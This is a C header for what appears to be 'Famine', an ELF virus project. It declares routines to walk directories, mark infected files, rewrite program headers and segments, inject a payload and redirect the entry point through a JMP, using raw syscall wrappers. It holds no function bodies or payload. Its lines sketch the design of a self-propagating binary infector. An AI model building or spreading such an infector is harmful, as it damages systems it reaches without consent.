#ifndef FAMINE_H
#define FAMINE_H

////////////////////////////////////////////////////////////////////////////////
/// INCLUDES 
////////////////////////////////////////////////////////////////////////////////

#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <sys/mman.h>
#include <stdbool.h>
#include <dirent.h>
#include <elf.h>

////////////////////////////////////////////////////////////////////////////////
/// DEFINES
////////////////////////////////////////////////////////////////////////////////

#define INFECTED_MAGIC_NUMBER 0x4e5750
#define ELF_MAGIC_SIZE 4
#define ELF_MAGIC_NUMBER 1179403647
#define X86_64 2

#define JMP_OFFSET 66
#define JMP_OPCODE 0xe9

#define PAYLOAD_SIZE 5387

#define BUFF_SIZE 1024 * 1024

#define ROOT_SIZE 4
#define USER_SIZE 2

#define CRITERIA_SIZE 4

#define FAILURE -1
#define SUCCESS 0

////////////////////////////////////////////////////////////////////////////////
/// STRUCTURES
////////////////////////////////////////////////////////////////////////////////

struct linux_dirent64
{
	uint64_t d_ino;
	int64_t d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[];
};

struct directory
{
	char path[PATH_MAX];
	size_t entry;
};

struct s_info
{
	int fd;
	void *ptr;
	size_t size;
	const char *name;

	Elf64_Phdr *note;
	Elf64_Phdr *data;
	
	Elf64_Addr old_entry;
	Elf64_Addr new_entry;
};

struct criteria
{
	bool (*fct)(const Elf64_Ehdr *header);
};

////////////////////////////////////////////////////////////////////////////////
/// PROTOTYPES 
////////////////////////////////////////////////////////////////////////////////

// FAMINE
void constructor(void);
__attribute__((hot)) void famine(const char *file, const size_t m_entry);
void modify_segment(struct s_info *info);
void modify_header(struct s_info *info, Elf64_Ehdr *header);
void inject(const struct s_info *info, const size_t m_entry);
void test(void);

// INFO
struct s_info get_info(const char *file);
void release_info(struct s_info *info);

// LIB
int _getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
int _close(int fd);
int _open(const char *pathname, int flags, long mode);
void *_mmap(void *addr, size_t length,  size_t prot, size_t flags, size_t fd, size_t offset);
int _munmap(void *addr, size_t length);
int _getuid(void);
int _stat(const char *pathname, struct stat *statbuf);
int _write(int fd, const void *buf, long count);
size_t _get_random_integer(const size_t range);
size_t _strlen(const char *str);
void _bzero(char *str, const size_t size);
void _memcpy(void *dst, void const *src, const size_t size);
void Exit(int status);

// DIRENT

__attribute__((hot)) int8_t update_dirent(char *dirent, const char *path);
__attribute__((hot)) int8_t update_directory(struct directory *dir, const char *dirent);

#endif
